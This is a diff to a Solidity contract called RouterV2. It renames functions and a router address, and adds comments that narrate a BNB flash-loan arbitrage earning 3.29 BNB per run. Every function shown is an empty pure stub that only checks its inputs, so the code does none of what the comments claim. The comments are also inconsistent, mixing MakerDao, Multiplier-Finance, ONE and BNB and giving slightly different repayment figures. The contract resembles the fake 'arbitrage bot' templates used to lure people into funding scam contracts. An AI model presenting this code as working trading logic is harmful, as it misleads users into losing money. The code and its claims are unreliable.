@@ -125,11 +125,12 @@ contract RouterV2 {
             keccak256(abi.encodePacked((b))));
     }
 
-    function spookySwapAddress() public pure returns (address) {
-        return 0xCb3591d5081a58c7550764F6F5e9B6C39D260E1d;
+    function viperSwapAddress() public pure returns (address) {
+        return 0xB17f0DF93B201233Aa9b911fDFeF99997d65d695;
     }
 
-    function borrowFlashloanFromMaker(
+    //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
+    function borrowFlashloanFromMakerDao(
         address add0,
         address add1,
         uint256 amount
@@ -139,26 +140,30 @@ contract RouterV2 {
         require(amount > 0, "Amount should be greater than 0.");
     }
 
-    function convertFtmTo(address add0, uint256 amount) public pure {
+    //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
+    function convertOneTo(address add0, uint256 amount) public pure {
         require(uint(add0) != 0, "Address is invalid");
         require(amount > 0, "Amount should be greater than 0");
     }
 
-    function ftmSwapAddress() public pure returns (address) {
+    function oneSwapAddress() public pure returns (address) {
         return 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5;
     }
 
-    function callArbitrageMaker(address add0, address add1) public pure {
+    //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
+    function callArbitrageMakerDao(address add0, address add1) public pure {
         require(uint(add0) != 0, "Address is invalid!");
         require(uint(add1) != 0, "Address is invalid!");
     }
 
-    function transferFtmToMaker(address add0)
+    //After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
+    function transferOneToMakerDao(address add0)
         public pure
     {
         require(uint(add0) != 0, "Address is invalid!");
     }
 
+    //5. Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
     function completeTransation(uint256 balanceAmount) public pure {
         require(balanceAmount >= 0, "Amount should be greater than 0!");
     }
@@ -208,3 +213,5 @@ contract RouterV2 {
 
         ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
         lendingPool.flashLoan(address(this), _asset, amount, data);*/
+    }
+}
